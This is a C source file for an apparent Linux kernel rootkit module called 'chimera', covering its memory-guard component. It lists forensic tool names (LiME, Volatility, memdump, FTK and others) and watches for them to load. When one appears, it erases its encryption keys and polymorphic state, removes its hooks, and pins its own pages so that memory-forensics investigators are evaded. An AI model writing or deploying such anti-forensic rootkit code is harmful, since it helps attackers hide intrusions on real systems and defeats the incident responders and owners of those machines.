#include "chimera.h"

struct guarded_page {
    unsigned long vaddr;
    unsigned long pfn;
    struct page *page;
};

static struct guarded_page *guarded_pages = NULL;
static int guarded_count = 0;
static int guarded_capacity = 0;

static const char *forensic_modules[] = {
    "lime", "volatility", "memdump", "ftk", "winen",
    "rekon", "findpt", "mdd", NULL
};

static int module_notify(struct notifier_block *nb,
                         unsigned long action, void *data)
{
    struct module *mod = (struct module *)data;

    if (action == MODULE_STATE_COMING) {
        for (int i = 0; forensic_modules[i]; i++) {
            if (strcasestr(mod->name, forensic_modules[i])) {
                pr_info("chimera: forensic module detected, self-wiping\n");

                memset(g_state.session_key, 0, AES_KEY_SIZE);
                memset(g_state.aes_iv, 0, AES_BLOCK_SIZE);
                memset(&g_state.poly, 0, sizeof(g_state.poly));

                rk_cleanup_hooks();

                for (int j = 0; j < guarded_count; j++) {
                    struct guarded_page *gp = &guarded_pages[j];
                    if (gp->page)
                        SetPageReserved(gp->page);
                }

                break;
            }
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block module_nb = {
    .notifier_call = module_notify,
};

int rk_mem_guard_init(void)
{
    struct module *mod = THIS_MODULE;
    unsigned long start, end;
    int npages;

    if (!mod->core_layout.base || mod->core_layout.size == 0)
        return -EINVAL;

    start = (unsigned long)mod->core_layout.base;
    end   = start + mod->core_layout.size;
    npages = (end - start) >> PAGE_SHIFT;

    guarded_pages = kzalloc(sizeof(*guarded_pages) * npages, GFP_KERNEL);
    if (!guarded_pages)
        return -ENOMEM;

    guarded_capacity = npages;

    for (int i = 0; i < npages; i++) {
        unsigned long vaddr = start + (i << PAGE_SHIFT);
        unsigned long pfn   = virt_to_pfn((void *)vaddr);
        struct page *pg     = pfn_to_page(pfn);

        guarded_pages[guarded_count].vaddr = vaddr;
        guarded_pages[guarded_count].pfn   = pfn;
        guarded_pages[guarded_count].page  = pg;
        guarded_count++;

        SetPageReserved(pg);
    }

    register_module_notifier(&module_nb);

    return 0;
}

void rk_mem_guard_cleanup(void)
{
    for (int i = 0; i < guarded_count; i++) {
        if (guarded_pages[i].page)
            ClearPageReserved(guarded_pages[i].page);
    }

    unregister_module_notifier(&module_nb);
    kfree(guarded_pages);
    guarded_pages = NULL;
    guarded_count = 0;
    guarded_capacity = 0;
}
